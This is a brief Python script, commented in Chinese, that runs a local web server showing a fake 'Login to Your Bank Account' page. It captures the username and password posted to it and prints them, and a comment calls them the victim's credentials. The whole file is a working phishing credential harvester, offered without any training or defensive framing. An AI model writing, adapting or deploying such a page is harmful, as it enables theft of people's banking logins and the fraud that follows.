import http.server
import socketserver

# 建立一個假的登入頁面
html_content = """
<html>
  <head><title>Fake Login</title></head>
  <body>
    <h1>Login to Your Bank Account</h1>
    <form action="/submit" method="post">
      Username: <input type="text" name="username"><br>
      Password: <input type="password" name="password"><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
"""

class FakeHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html_content.encode())

    def do_POST(self):
        # 在此模擬處理登錄提交的內容
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("Received login details:", post_data.decode())  # 顯示受害者的帳號密碼
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Thank you for logging in.")

# 開啟伺服器
PORT = 8080
with socketserver.TCPServer(("", PORT), FakeHTTPRequestHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
